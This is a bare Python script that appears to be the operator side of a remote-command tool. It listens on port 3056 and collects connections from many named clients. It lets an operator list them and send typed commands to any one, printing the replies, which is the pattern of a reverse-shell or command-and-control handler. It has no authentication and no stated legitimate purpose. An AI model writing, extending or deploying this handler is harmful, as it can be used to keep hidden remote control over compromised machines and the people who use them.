import socket, threading


class SocketBinder():
    def __init__(self):
        self.ADDR = ('', 3056)
        self.SIZE = 1024
        self.client_list = []
        
    def receive_connect(self):
        with socket.socket() as server_socket:
            server_socket.bind(self.ADDR)
            server_socket.listen()
            while True:
                client_socket, client_addr = server_socket.accept()
                name = client_socket.recv(self.SIZE).decode()
                print('\nNew connect: {}\n>>> '.format(name), end='')
                self.client_list.append((name, client_socket))


    def get_client_list(self):
        for i in range(len(self.client_list)-1, -1, -1):
            self.client_list[i][1].sendall(' '.encode())
            if self.client_list[i][1].recv(self.SIZE).decode() == 'Error':
                self.terminate_connect(i)
        if len(self.client_list)==0:
            print('No client')
            return
        for i in range(len(self.client_list)):
            print('[ {}, {} ]'.format(i, self.client_list[i][0]))


    def command_mode(self, i):
        t_name, t_socket = self.client_list[i]
        try:
            while True:
                cmd = input('{} >> '.format(t_name))
                if cmd == 'exit':
                    break
                t_socket.sendall(cmd.encode())
                res = t_socket.recv(self.SIZE).decode()
                if res == 'Error':
                    self.terminate_connect(i)
                    break
                print(res)
        except:
            self.terminate_connect(i)

    def terminate_connect(self, i):
        print('Disconnected [ {} ]'.format(self.client_list[i][0]))
        self.client_list[i][1].close()
        del self.client_list[i]

        
if __name__ == '__main__':
    sb = SocketBinder()
    rc = threading.Thread(target=sb.receive_connect)
    rc.daemon = True
    rc.start()

    while True:
        cmd = input('>>> ')
        if cmd == 'status':
            sb.get_client_list()
        if cmd == 'exit':
            break
        cmd = cmd.split()
        if len(cmd) > 1:
            if cmd[0] == 'enter':
                sb.command_mode(int(cmd[1]))

